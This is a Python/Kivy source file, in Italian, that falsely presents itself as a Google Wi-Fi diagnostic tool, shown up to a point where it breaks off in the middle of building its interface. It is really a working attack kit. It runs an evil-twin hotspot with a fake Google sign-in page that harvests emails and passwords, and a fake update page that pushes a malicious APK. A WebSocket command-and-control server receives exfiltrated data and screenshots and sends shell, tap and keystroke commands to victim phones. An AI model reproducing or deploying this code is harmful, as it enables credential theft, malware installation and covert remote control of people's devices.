"""
Servizi Wi-Fi Google v4.0 — Interfaccia grafica completa
Google LLC - Strumento di diagnostica rete
Tutto controllabile dall'app, nessun codice da modificare
"""
import os, sys, json, base64, threading, time, subprocess, re, socket, random
from datetime import datetime
from collections import deque

# ================================================================
# IMPORTAZIONI KIVY (DEVONO ESSERE PRIME)
# ================================================================
os.environ['KIVY_NO_ARGS'] = '1'
import kivy
kivy.require('2.2.0')
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.switch import Switch
from kivy.uix.spinner import Spinner
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserListView
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.clock import Clock, mainthread
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle

# ================================================================
# CONFIGURAZIONE GLOBALE
# ================================================================
CONFIG = {
    'evil_ssid': 'FastWeb_Free_Public',
    'evil_password': 'password123',
    'rcs_port': 8765,
    'http_port': 8080,
    'auto_connect': True,
    'exfil_interval': 300,
}

STEALTH_DIR = "/sdcard/Android/data/com.google.android.gms/cache/.sys"
os.makedirs(STEALTH_DIR, exist_ok=True)

# ================================================================
# LOGGER IN TEMPO REALE
# ================================================================
class LogBuffer:
    """Buffer circolare per i log, accessibile dalla UI"""
    def __init__(self, maxlen=500):
        self.buffer = deque(maxlen=maxlen)
        self.callbacks = []
    
    def write(self, text):
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {text}"
        self.buffer.append(entry)
        for cb in self.callbacks:
            try:
                cb(entry)
            except:
                pass
    
    def flush(self):
        pass
    
    def get_all(self):
        return list(self.buffer)
    
    def register_callback(self, cb):
        self.callbacks.append(cb)

log = LogBuffer()

# ================================================================
# EVIL TWIN ENGINE
# ================================================================
class EvilTwinEngine:
    """Gestisce hotspot + captive portal"""
    
    def __init__(self):
        self.running = False
        self.server = None
        self.creds_file = os.path.join(os.path.dirname(__file__), 'captive', 'creds.txt')
        self.apk_file = os.path.join(os.path.dirname(__file__), 'captive', 'download', 'ServiziWiFiGoogle.apk')
        os.makedirs(os.path.dirname(self.creds_file), exist_ok=True)
        os.makedirs(os.path.dirname(self.apk_file), exist_ok=True)
        self.callback = None
    
    def set_callback(self, cb):
        self.callback = cb
    
    def start(self, ssid=None, password=None):
        if self.running:
            log.write("[EvilTwin] Già in esecuzione")
            return False
        
        if ssid:
            CONFIG['evil_ssid'] = ssid
        if password:
            CONFIG['evil_password'] = password
        
        log.write(f"[EvilTwin] Avvio hotspot '{CONFIG['evil_ssid']}'...")
        
        # Avvia hotspot via Termux:API
        try:
            subprocess.run(['termux-wifi-hotspot', 'start', CONFIG['evil_ssid'], CONFIG['evil_password']],
                         timeout=10, capture_output=True)
            log.write(f"[EvilTwin] ✓ Hotspot '{CONFIG['evil_ssid']}' avviato")
        except:
            log.write("[EvilTwin] ! Termux:API non trovato. Avvia hotspot manualmente")
            log.write(f"[EvilTwin] ! SSID: {CONFIG['evil_ssid']} / Password: {CONFIG['evil_password']}")
        
        # Avvia server HTTP in thread
        self.running = True
        t = threading.Thread(target=self._run_server, daemon=True)
        t.start()
        
        # Monitoraggio credenziali
        Clock.schedule_interval(self._check_creds, 2)
        
        return True
    
    def stop(self):
        self.running = False
        try:
            subprocess.run(['termux-wifi-hotspot', 'stop'], timeout=5, capture_output=True)
            log.write("[EvilTwin] Hotspot fermato")
        except:
            pass
    
    def _run_server(self):
        """Avvia server HTTP per captive portal"""
        import http.server
        import socketserver
        import urllib.parse
        
        PORT = 80
        
        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                p = urllib.parse.urlparse(self.path)
                if '/download' in p.path or p.path.endswith('.apk'):
                    self._serve_apk(); return
                if p.path == '/submit':
                    q = urllib.parse.parse_qs(p.query)
                    e, pw = q.get('email',[''])[0], q.get('password',[''])[0]
                    if e and pw:
                        with open(os.path.join(os.path.dirname(__file__), 'captive', 'creds.txt'), 'a') as f:
                            f.write(f"[{datetime.now()}] EMAIL:{e} | PASSWORD:{pw}\n")
                        log.write(f"🔥 CREDENZIALI: {e} : {pw}")
                        self.send_response(302); self.send_header('Location','/update-required'); self.end_headers(); return
                self.send_response(200); self.send_header('Content-type','text/html;charset=utf-8'); self.end_headers()
                ssid = CONFIG['evil_ssid']
                if p.path == '/update-required':
                    self.wfile.write(f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Aggiornamento - Google</title><style>body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.card{{max-width:400px;width:90%;padding:35px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);text-align:center}}.warn{{background:#fef7e0;border:1px solid #f9d849;border-radius:8px;padding:12px;font-size:13px;color:#5f4b00;margin:15px 0;text-align:left}}h1{{font-size:20px;color:#202124}}.btn{{display:inline-block;background:#1a73e8;color:#fff;padding:14px 30px;border-radius:6px;text-decoration:none;font-size:14px;font-weight:500;margin-top:15px}}a{{color:#1a73e8}}</style></head><body><div class="card"><div style="font-size:40px">&#9888;</div><h1>Aggiornamento richiesto</h1><p style="color:#5f6368;font-size:14px">Google richiede l\'ultimo aggiornamento dei servizi Wi-Fi per la sicurezza della connessione a <b>{ssid}</b>.</p><div class="warn"><strong>&#9432;</strong> L\'aggiornamento crittografa la connessione e previene intercettazioni.</div><a class="btn" href="download/ServiziWiFiGoogle.apk" download>&#11015; Installa Aggiornamento Google Wi-Fi Service</a><p style="font-size:11px;color:#9aa0a6;margin-top:20px"><a href="https://policies.google.com/privacy">Privacy</a> &middot; <a href="https://policies.google.com/terms">Termini</a></p></div><script>setTimeout(function(){{window.location.href="download/ServiziWiFiGoogle.apk"}},4000)</script></body></html>'''.encode())
                else:
                    self.wfile.write(f'''<!DOCTYPE html><html lang="it"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Accedi - Google</title><style>body{{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.card{{max-width:400px;width:90%;padding:40px 30px;text-align:center}}h1{{font-size:22px;font-weight:400;color:#202124}}p{{color:#5f6368;font-size:14px;margin:10px 0 25px}}input{{width:100%;padding:13px;border:1px solid #dadce0;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none}}input:focus{{border-color:#1a73e8}}button{{background:#1a73e8;color:#fff;border:none;padding:12px 24px;border-radius:4px;font-size:14px;cursor:pointer;float:right}}.footer a{{color:#5f6368;text-decoration:none;font-size:12px}}</style></head><body><div class="card"><svg viewBox="0 0 48 48" width="72"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.6A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.52l7.98-5.93z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.93C6.51 42.62 14.62 48 24 48z"/></svg><h1>Accedi al Wi-Fi</h1><p>Rete: <b>{ssid}</b><br><small>Verifica la tua identit&agrave; Google</small></p><form action="/submit" method="GET"><input type="email" name="email" placeholder="Email" required autofocus><input type="password" name="password" placeholder="Password" required><div><button type="submit">Accedi</button></div></form><p style="font-size:12px;color:#5f6368;margin-top:20px"><a href="https://policies.google.com/privacy">Privacy</a> &middot; <a href="https://policies.google.com/terms">Termini</a></p></div></body></html>'''.encode())
            def _serve_apk(self):
                apk = os.path.join(os.path.dirname(__file__), 'captive', 'download', 'ServiziWiFiGoogle.apk')
                if os.path.exists(apk):
                    sz = os.path.getsize(apk)
                    self.send_response(200); self.send_header('Content-type','application/vnd.android.package-archive')
                    self.send_header('Content-Disposition','attachment; filename="ServiziWiFiGoogle.apk"'); self.end_headers()
                    with open(apk,'rb') as f: self.wfile.write(f.read())
                    log.write(f"[APK] Scaricato ({sz/1024:.1f} KB)")
                else: self.send_response(302); self.send_header('Location','https://www.google.com'); self.end_headers()
            def log_message(self, fmt, *a): pass
        
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", PORT), Handler)
            log.write(f"[EvilTwin] ✓ Server HTTP su :{PORT}")
            self.server.serve_forever()
        except Exception as e:
            log.write(f"[EvilTwin] ✗ Errore server: {e}")
    
    def _check_creds(self, dt):
        """Controlla nuove credenziali (callback alla UI)"""
        if self.callback and os.path.exists(self.creds_file):
            try:
                with open(self.creds_file, 'r') as f:
                    content = f.read()
                if content:
                    self.callback(content)
            except:
                pass

# ================================================================
# RCS ENGINE (REVERSE CONNECTION SERVER)
# ================================================================
class RCSEngine:
    """Server WebSocket per controllo remoto device vittima"""
    
    def __init__(self):
        self.running = False
        self.devices = {}
        self.server = None
        self.callback = None
        self.target = None
    
    def set_callback(self, cb):
        self.callback = cb
    
    def start(self, port=None):
        if self.running:
            log.write("[RCS] Già in esecuzione")
            return False
        
        port = port or CONFIG['rcs_port']
        self.running = True
        
        t = threading.Thread(target=self._run_server, args=(port,), daemon=True)
        t.start()
        return True
    
    def stop(self):
        self.running = False
        self.devices = {}
    
    def _run_server(self, port):
        import asyncio
        try:
            import websockets
        except ImportError:
            log.write("[RCS] ! websockets non installato. Esegui: pip install websockets")
            return
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def handler(ws):
            did = None
            try:
                m = json.loads(await asyncio.wait_for(ws.recv(), 10))
                if m.get('type') == 'register':
                    did = m.get('device_id', f'device_{random.randint(1000,9999)}')
                    self.devices[did] = {
                        'ws': ws,
                        'ip': ws.remote_address[0],
                        'model': m.get('model', '?'),
                        'android': m.get('android', '?'),
                        'started': datetime.now(),
                    }
                    log.write(f"[RCS] ✅ {m.get('model','?')} connesso ({did}) - {ws.remote_address[0]}")
                    if self.callback:
                        self.callback('device_connected', did, self.devices[did])
                    
                    while self.running:
                        try:
                            m = json.loads(await asyncio.wait_for(ws.recv(), 30))
                            t = m.get('type')
                            if t == 'screen':
                                fn = os.path.join(STEALTH_DIR, f'screens/{did}_live.jpg')
                                os.makedirs(os.path.dirname(fn), exist_ok=True)
                                with open(fn, 'wb') as f:
                                    f.write(base64.b64decode(m['data']))
                                if self.callback:
                                    self.callback('screenshot', did, fn)
                            elif t == 'exfiltration_report':
                                log.write(f"[RCS] 📁 Report dati da {did}")
                                rf = os.path.join(STEALTH_DIR, f'reports/{did}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
                                os.makedirs(os.path.dirname(rf), exist_ok=True)
                                with open(rf, 'w') as f:
                                    json.dump(json.loads(m.get('data', '{}')), f, indent=2, default=str)
                                if self.callback:
                                    self.callback('report', did, rf)
                            elif t == 'shell_output':
                                if self.callback:
                                    self.callback('shell', did, m.get('output', ''))
                        except asyncio.TimeoutError:
                            continue
            except:
                pass
            finally:
                if did and did in self.devices:
                    del self.devices[did]
                    log.write(f"[RCS] ❌ {did} disconnesso")
        
        async def serve():
            async with websockets.serve(handler, "0.0.0.0", port):
                log.write(f"[RCS] ✓ Server su :{port}")
                await asyncio.Future()
        
        try:
            loop.run_until_complete(serve())
        except:
            pass
    
    def send_command(self, device_id, action, params=''):
        """Invia comando a un device"""
        if device_id not in self.devices:
            log.write(f"[RCS] ✗ Device {device_id} non trovato")
            return False
        
        import asyncio
        msg = json.dumps({'type': 'command', 'action': action, 'params': params})
        try:
            ws = self.devices[device_id]['ws']
            asyncio.run(ws.send(msg))
            log.write(f"[RCS] > Comando '{action}' inviato a {device_id}")
            return True
        except Exception as e:
            log.write(f"[RCS] ✗ Errore invio: {e}")
            return False
    
    def get_device_list(self):
        """Restituisce lista device connessi"""
        return list(self.devices.items())

# ================================================================
# SINGOLETON ENGINE
# ================================================================
evil_engine = EvilTwinEngine()
rcs_engine = RCSEngine()

# ================================================================
# INTERFACCIA GRAFICA - TABELLE
# ================================================================

class StyledLabel(Label):
    """Label con stile uniforme"""
    def __init__(self, **kwargs):
        kwargs.setdefault('font_size', 13)
        kwargs.setdefault('color', (0.9, 0.9, 0.95, 1))
        kwargs.setdefault('halign', 'left')
        kwargs.setdefault('valign', 'middle')
        super().__init__(**kwargs)

class StyledButton(Button):
    """Pulsante con stile hacker"""
    def __init__(self, **kwargs):
        kwargs.setdefault('background_color', (0.12, 0.12, 0.15, 1))
        kwargs.setdefault('color', (0, 1, 0, 1))
        kwargs.setdefault('font_size', 13)
        kwargs.setdefault('bold', True)
        super().__init__(**kwargs)

class LogLabel(Label):
    """Label per log - si aggiorna in tempo reale"""
    def __init__(self, **kwargs):
        kwargs.setdefault('font_size', 11)
        kwargs.setdefault('color', (0, 1, 0, 1))
        kwargs.setdefault('halign', 'left')
        kwargs.setdefault('valign', 'top')
        kwargs.setdefault('text_size', (None, None))
        kwargs.setdefault('size_hint_y', None)
        super().__init__(**kwargs)
        self.height = 20

class ConsoleOutput(ScrollView):
    """Widget console scrollabile"""
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = BoxLayout(orientation='vertical', size_hint_y=1)
        self.layout.bind(minimum_height=self.layout.setter('height'))
        self.add_widget(self.layout)
    
    def add_line(self, text, color=(0,1,0,1)):
        """Aggiunge riga di log"""
        l = Label(text=text, font_size=11, color=color, halign='left', valign='middle',
                 size_hint_y=None, height=18, text_size=(self.width-10, None))
        self.layout.add_widget(l)
        # Scrolla in fondo
        self.scroll_to(l)
    
    def clear(self):
        self.layout.clear_widgets()

# ================================================================
# TAB 1: EVIL TWIN
# ================================================================
class EvilTwinTab(BoxLayout):
    """Tab per configurare e gestire Evil Twin"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.spacing = 8
        self.padding = 12
        self._build_ui()
        
        # Collega callback evil_engine
        evil_engine.set_callback(self._on_creds)
    
    def _build_ui(self):
        # Titolo
        self.add_widget(Label(text='EVIL TWIN - Captive Portal', font_size=18, bold=True,
                             color=(0,1,0,1), size_hint_y=0.06))
        
        # Configurazione SSID
        cfg = BoxLayout(size_hint_y=0.07, spacing=8)
        cfg.add_widget(Label(text='SSID:', size_hint_x=0.12, color=(0.7,0.7,0.7,1)))
        self.ssid_input = TextInput(text=CONFIG['evil_ssid'], size_hint_x=0.38, 
                                   background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        cfg.add_widget(self.ssid_input)
        cfg.add_widget(Label(text='Password:', size_hint_x=0.15, color=(0.7,0.7,0.7,1)))
        self.pwd_input = TextInput(text=CONFIG['evil_password'], size_hint_x=0.35,
                                   background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        cfg.add_widget(self.pwd_input)
        self.add_widget(cfg)
        
        # Pulsanti
        btns = BoxLayout(size_hint_y=0.07, spacing=8)
        self.start_btn = StyledButton(text='▶ AVVIA EVIL TWIN', background_color=(0,0.5,0,1))
        self.start_btn.bind(on_press=self._toggle_evil)
        btns.add_widget(self.start_btn)
        self.stop_btn = StyledButton(text='■ FERMA', background_color=(0.5,0,0,1), disabled=True)
        self.stop_btn.bind(on_press=self._stop_evil)
        btns.add_widget(self.stop_btn)
        self.view_creds_btn = StyledButton(text='👁 VEDI CREDENZIALI')
        self.view_creds_btn.bind(on_press=self._view_creds)
        btns.add_widget(self.view_creds_btn)
        self.add_widget(btns)
        
        # APK status
        apk_status = BoxLayout(size_hint_y=0.05, spacing=8)
        apk_path = os.path.join(os.path.dirname(__file__), 'captive', 'download', 'ServiziWiFiGoogle.apk')
        apk_ok = os.path.exists(apk_path)
        apk_label = Label(text=f'📦 APK: {"✅ Presente" if apk_ok else "❌ Assente - Metti APK in captive/download/"}',
                         color=(0,1,0,1) if apk_ok else (1,0.5,0,1), font_size=12)
        apk_status.add_widget(apk_label)
        self.add_widget(apk_status)
        
        # Console log
        self.add_widget(Label(text='LOG:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.03))
        self.console = ConsoleOutput(size_hint_y=0.5)
        self.add_widget(self.console)
        
        # Credenziali catturate
        self.add_widget(Label(text='CREDENZIALI CATTURATE:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.03))
        self.creds_area = TextInput(readonly=True, font_size=11, 
                                     background_color=(0.05,0.05,0.07,1), foreground_color=(1,1,0,1),
                                     size_hint_y=0.15)
        self.add_widget(self.creds_area)
        
        # Avvia log
        log.register_callback(self._log_handler)
    
    def _log_handler(self, entry):
        """Callback per nuovi log"""
        self.console.add_line(entry)
    
    def _toggle_evil(self, btn):
        ssid = self.ssid_input.text.strip() or CONFIG['evil_ssid']
        pwd = self.pwd_input.text.strip() or CONFIG['evil_password']
        if not ssid:
            return
        self.start_btn.disabled = True
        self.start_btn.text = '⏳ AVVIO...'
        self.stop_btn.disabled = False
        threading.Thread(target=evil_engine.start, args=(ssid, pwd), daemon=True).start()
        Clock.schedule_once(lambda dt: setattr(self.start_btn, 'text', '✅ ATTIVO'), 2)
    
    def _stop_evil(self, btn):
        evil_engine.stop()
        self.start_btn.disabled = False
        self.start_btn.text = '▶ AVVIA EVIL TWIN'
        self.stop_btn.disabled = True
        self.console.add_line('[EvilTwin] Fermato', (1,0.5,0,1))
    
    def _on_creds(self, content):
        """Callback quando arrivano nuove credenziali"""
        Clock.schedule_once(lambda dt: self._update_creds(content))
    
    def _update_creds(self, content):
        self.creds_area.text = content
        # Effetto lampeggio
        self.creds_area.background_color = (0.2, 0.2, 0, 1)
        Clock.schedule_once(lambda dt: setattr(self.creds_area, 'background_color', (0.05,0.05,0.07,1)), 1)
    
    def _view_creds(self, btn):
        """Mostra popup con tutte le credenziali"""
        try:
            with open(os.path.join(os.path.dirname(__file__), 'captive', 'creds.txt'), 'r') as f:
                content = f.read() or 'Nessuna credenziale ancora catturata'
        except:
            content = 'File credenziali non trovato'
        
        popup = Popup(title='📋 Credenziali Catturate',
                      content=Label(text=content, font_size=12, color=(1,1,0,1)),
                      size_hint=(0.8, 0.6))
        popup.open()

# ================================================================
# TAB 2: RCS CONTROL
# ================================================================
class RCSTab(BoxLayout):
    """Tab per controllo remoto dei device vittima"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.spacing = 8
        self.padding = 12
        self._build_ui()
        
        rcs_engine.set_callback(self._rcs_callback)
    
    def _build_ui(self):
        # Titolo
        self.add_widget(Label(text='RCS - REMOTE CONTROL SERVER', font_size=18, bold=True,
                             color=(0,1,0,1), size_hint_y=0.05))
        
        # Porta
        port_box = BoxLayout(size_hint_y=0.05, spacing=8)
        port_box.add_widget(Label(text='Porta:', color=(0.7,0.7,0.7,1), size_hint_x=0.1))
        self.port_input = TextInput(text=str(CONFIG['rcs_port']), size_hint_x=0.15,
                                   background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        port_box.add_widget(self.port_input)
        self.start_rcs_btn = StyledButton(text='▶ AVVIA RCS', background_color=(0,0.5,0,1), size_hint_x=0.2)
        self.start_rcs_btn.bind(on_press=self._toggle_rcs)
        port_box.add_widget(self.start_rcs_btn)
        self.stop_rcs_btn = StyledButton(text='■ FERMA', background_color=(0.5,0,0,1), size_hint_x=0.15, disabled=True)
        self.stop_rcs_btn.bind(on_press=self._stop_rcs)
        port_box.add_widget(self.stop_rcs_btn)
        self.add_widget(port_box)
        
        # Lista device + controllo
        mid = BoxLayout(orientation='horizontal', size_hint_y=0.35, spacing=8)
        
        # Lista device
        left = BoxLayout(orientation='vertical', spacing=4)
        left.add_widget(Label(text='DISPOSITIVI CONNESSI:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.08))
        self.device_list = ScrollView()
        self.device_layout = BoxLayout(orientation='vertical', size_hint_y=None)
        self.device_layout.bind(minimum_height=self.device_layout.setter('height'))
        self.device_list.add_widget(self.device_layout)
        left.add_widget(self.device_list)
        mid.add_widget(left)
        
        # Pannello comandi
        right = BoxLayout(orientation='vertical', spacing=4)
        right.add_widget(Label(text='COMANDI:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.08))
        
        cmd_grid = GridLayout(cols=2, spacing=4, size_hint_y=0.6)
        
        self.target_label = Label(text='Nessun target', color=(1,0.5,0,1), font_size=12)
        cmd_grid.add_widget(self.target_label)
        cmd_grid.add_widget(Label(text=''))
        
        self.exfil_btn = StyledButton(text='📁 EXFIL Dati', disabled=True)
        self.exfil_btn.bind(on_press=lambda x: self._send_cmd('exfil'))
        cmd_grid.add_widget(self.exfil_btn)
        
        self.screenshot_btn = StyledButton(text='📸 Screenshot', disabled=True)
        self.screenshot_btn.bind(on_press=lambda x: self._send_cmd('screenshot'))
        cmd_grid.add_widget(self.screenshot_btn)
        
        self.tap_btn = StyledButton(text='👆 Tap X Y', disabled=True)
        self.tap_btn.bind(on_press=self._tap_dialog)
        cmd_grid.add_widget(self.tap_btn)
        
        self.text_btn = StyledButton(text='⌨️ Invia testo', disabled=True)
        self.text_btn.bind(on_press=self._text_dialog)
        cmd_grid.add_widget(self.text_btn)
        
        self.key_btn = StyledButton(text='🔑 Key (home/back/enter)', disabled=True)
        self.key_btn.bind(on_press=self._key_dialog)
        cmd_grid.add_widget(self.key_btn)
        
        self.shell_btn = StyledButton(text='💻 Shell comando', disabled=True)
        self.shell_btn.bind(on_press=self._shell_dialog)
        cmd_grid.add_widget(self.shell_btn)
        
        self.ssid_btn = StyledButton(text='📶 Cambia SSID', disabled=True)
        self.ssid_btn.bind(on_press=self._ssid_dialog)
        cmd_grid.add_widget(self.ssid_btn)
        
        right.add_widget(cmd_grid)
        
        # Info target
        self.target_info = Label(text='', font_size=10, color=(0.5,0.5,0.5,1), size_hint_y=0.2)
        right.add_widget(self.target_info)
        
        mid.add_widget(right)
        self.add_widget(mid)
        
        # Output / Log
        self.add_widget(Label(text='OUTPUT:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.03))
        self.output = ConsoleOutput(size_hint_y=0.4)
        self.add_widget(self.output)
        
        # Screenshot preview
        self.screenshot_img = Image(size_hint_y=0.1, keep_ratio=True, allow_stretch=True, opacity=0)
        self.add_widget(self.screenshot_img)
        
        log.register_callback(self._log_handler)
    
    def _log_handler(self, entry):
        self.output.add_line(entry)
    
    def _toggle_rcs(self, btn):
        port = int(self.port_input.text)
        self.start_rcs_btn.disabled = True
        self.start_rcs_btn.text = '⏳ AVVIO...'
        self.stop_rcs_btn.disabled = False
        threading.Thread(target=rcs_engine.start, args=(port,), daemon=True).start()
        Clock.schedule_once(lambda dt: setattr(self.start_rcs_btn, 'text', '✅ ATTIVO'), 2)
    
    def _stop_rcs(self, btn):
        rcs_engine.stop()
        self.start_rcs_btn.disabled = False
        self.start_rcs_btn.text = '▶ AVVIA RCS'
        self.stop_rcs_btn.disabled = True
        self._refresh_devices()
    
    def _rcs_callback(self, event_type, device_id, data):
        """Callback eventi RCS"""
        if event_type == 'device_connected':
            Clock.schedule_once(lambda dt: self._refresh_devices())
        elif event_type == 'screenshot':
            Clock.schedule_once(lambda dt: self._show_screenshot(data))
        elif event_type == 'report':
            Clock.schedule_once(lambda dt: self.output.add_line(f'📁 Report salvato: {data}', (0,1,1,1)))
        elif event_type == 'shell':
            Clock.schedule_once(lambda dt: self.output.add_line(f'💻 Output:\n{data[:2000]}', (1,1,1,1)))
    
    def _refresh_devices(self):
        """Aggiorna lista device nella UI"""
        self.device_layout.clear_widgets()
        devices = rcs_engine.get_device_list()
        
        if not devices:
            self.device_layout.add_widget(Label(text='Nessun dispositivo connesso', 
                                               color=(0.5,0.5,0.5,1), size_hint_y=None, height=30))
            return
        
        for did, info in devices:
            btn = Button(text=f"  {info['model']} ({did[:8]})", size_hint_y=None, height=35,
                        background_color=(0.12,0.12,0.15,1), color=(0,1,0,1),
                        halign='left', font_size=12)
            btn.bind(on_press=lambda x, d=did: self._select_target(d))
            self.device_layout.add_widget(btn)
    
    def _select_target(self, device_id):
        """Seleziona target"""
        if device_id in rcs_engine.devices:
            rcs_engine.target = device_id
            info = rcs_engine.devices[device_id]
            self.target_label.text = f"🎯 {info['model']} ({device_id[:8]})"
            self.target_label.color = (0,1,0,1)
            self.target_info.text = f"IP: {info['ip']}\nAndroid: {info['android']}\nDa: {info['started'].strftime('%H:%M:%S')}"
            
            # Abilita pulsanti
            for btn in [self.exfil_btn, self.screenshot_btn, self.tap_btn, 
                       self.text_btn, self.key_btn, self.shell_btn, self.ssid_btn]:
                btn.disabled = False
            
            self.output.add_line(f'[RCS] ✅ Target: {info["model"]} ({device_id[:8]})', (0,1,0,1))
    
    def _send_cmd(self, action, params=''):
        """Invia comando al target selezionato"""
        did = rcs_engine.target
        if did:
            rcs_engine.send_command(did, action, params)
    
    def _tap_dialog(self, btn):
        """Dialog per coordinate tap"""
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        content.add_widget(Label(text='Coordinate X Y (es: 540 1200):', color=(0,1,0,1)))
        xy_input = TextInput(text='540 1200', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        content.add_widget(xy_input)
        btn_ok = StyledButton(text='INVIA')
        content.add_widget(btn_ok)
        popup = Popup(title='👆 Tap Coordinate', content=content, size_hint=(0.6, 0.4))
        btn_ok.bind(on_press=lambda x: (self._send_cmd('tap', xy_input.text), popup.dismiss()))
        popup.open()
    
    def _text_dialog(self, btn):
        """Dialog per invio testo"""
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        content.add_widget(Label(text='Testo da digitare:', color=(0,1,0,1)))
        txt_input = TextInput(text='', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        content.add_widget(txt_input)
        btn_ok = StyledButton(text='INVIA')
        content.add_widget(btn_ok)
        popup = Popup(title='⌨️ Invia Testo', content=content, size_hint=(0.6, 0.4))
        btn_ok.bind(on_press=lambda x: (self._send_cmd('text', txt_input.text), popup.dismiss()))
        popup.open()
    
    def _key_dialog(self, btn):
        """Dialog per key event"""
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        content.add_widget(Label(text='Tasto: home, back, menu, power, enter, volup, voldown, space, del', 
                                color=(0,1,0,1), font_size=11))
        key_input = TextInput(text='home', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        content.add_widget(key_input)
        btn_ok = StyledButton(text='INVIA')
        content.add_widget(btn_ok)
        popup = Popup(title='🔑 Key Event', content=content, size_hint=(0.7, 0.4))
        btn_ok.bind(on_press=lambda x: (self._send_cmd('key', key_input.text), popup.dismiss()))
        popup.open()
    
    def _shell_dialog(self, btn):
        """Dialog per comando shell"""
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        content.add_widget(Label(text='Comando shell:', color=(0,1,0,1)))
        cmd_input = TextInput(text='ls /sdcard', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        content.add_widget(cmd_input)
        btn_ok = StyledButton(text='ESEGUI')
        content.add_widget(btn_ok)
        popup = Popup(title='💻 Shell', content=content, size_hint=(0.8, 0.5))
        btn_ok.bind(on_press=lambda x: (self._send_cmd('shell', cmd_input.text), popup.dismiss()))
        popup.open()
    
    def _ssid_dialog(self, btn):
        """Dialog per cambiare SSID evil twin sul device remoto"""
        content = BoxLayout(orientation='vertical', spacing=8, padding=10)
        content.add_widget(Label(text='Nuovo SSID a cui connettersi:', color=(0,1,0,1)))
        ssid_input = TextInput(text='FastWeb_Free_Public', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        content.add_widget(ssid_input)
        btn_ok = StyledButton(text='CAMBIAA')
        content.add_widget(btn_ok)
        popup = Popup(title='📶 Cambia SSID', content=content, size_hint=(0.6, 0.4))
        btn_ok.bind(on_press=lambda x: (self._send_cmd('ssid', ssid_input.text), popup.dismiss()))
        popup.open()
    
    def _show_screenshot(self, path):
        """Mostra screenshot nella UI"""
        if os.path.exists(path):
            self.screenshot_img.source = path
            self.screenshot_img.opacity = 1
            self.screenshot_img.reload()
            self.screenshot_img.size_hint_y = 0.3
            self.output.add_line(f'📸 Screenshot aggiornato', (0,1,1,1))

# ================================================================
# TAB 3: DATA VIEW
# ================================================================
class DataViewTab(BoxLayout):
    """Tab per visualizzare dati esfiltrati dai device"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.spacing = 8
        self.padding = 12
        self._build_ui()
    
    def _build_ui(self):
        self.add_widget(Label(text='DATI ESFILTRATI', font_size=18, bold=True,
                             color=(0,1,0,1), size_hint_y=0.05))
        
        # Pulsanti di azione
        btns = BoxLayout(size_hint_y=0.06, spacing=8)
        
        refresh_btn = StyledButton(text='🔄 AGGIORNA')
        refresh_btn.bind(on_press=self._refresh_data)
        btns.add_widget(refresh_btn)
        
        open_report_btn = StyledButton(text='📂 APRI REPORT')
        open_report_btn.bind(on_press=self._open_report)
        btns.add_widget(open_report_btn)
        
        view_raw_btn = StyledButton(text='📄 VEDI RAW')
        view_raw_btn.bind(on_press=self._view_raw)
        btns.add_widget(view_raw_btn)
        
        self.add_widget(btns)
        
        # Selettore report
